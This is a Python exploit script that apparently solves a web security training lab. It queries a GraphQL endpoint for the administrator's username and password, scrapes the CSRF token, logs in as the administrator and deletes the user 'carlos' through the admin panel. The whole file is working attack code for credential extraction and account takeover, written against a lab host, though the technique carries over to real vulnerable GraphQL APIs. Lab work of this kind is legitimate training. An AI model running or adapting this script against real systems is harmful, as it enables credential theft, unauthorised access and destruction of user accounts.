import requests
import sys
import re

TARGET_URL = "https://0a8700fe03b71daf803b80c2003e006d.web-security-academy.net"
GRAPHQL_URL = f"{TARGET_URL}/graphql/v1"
LOGIN_URL = f"{TARGET_URL}/login"
ADMIN_URL = f"{TARGET_URL}/admin"
DELETE_URL = f"{TARGET_URL}/admin/delete?username=carlos"

def solve_lab():
    session = requests.Session()
    
    print("Extracting Administrator Credentials...")
    
    query = """
    query {
        getUser(id: 1) {
            username
            password
        }
    }
    """
    
    try:
        resp = session.post(GRAPHQL_URL, json={"query": query})
        data = resp.json()
        
        if 'data' in data and 'getUser' in data['data']:
            user_data = data['data']['getUser']
            username = user_data['username']
            password = user_data['password']
            print(f"Credentials Found: {username}:{password}")
        else:
            print("Failed to extract credentials.")
            return

        print("Logging in as Administrator...")
        r = session.get(LOGIN_URL)
        csrf = ""
        match = re.search(r'name="csrf" value="(.*?)"', r.text)
        if match:
            csrf = match.group(1)
        
        login_data = {
            "username": username,
            "password": password,
            "csrf": csrf
        }
        
        r = session.post(LOGIN_URL, data=login_data)
        
        if "Log out" in r.text or "Admin panel" in r.text:
            print("Login Successful.")
        else:
            print("Login Failed.")
            return

        print("Deleting user 'carlos'...")
        r = session.get(DELETE_URL)
        
        if r.status_code == 200:
            print("User 'carlos' deleted successfully. Lab Solved.")
        else:
            print("Failed to delete user.")
            
    except Exception as e:
        print(e)

if __name__ == "__main__":
    solve_lab()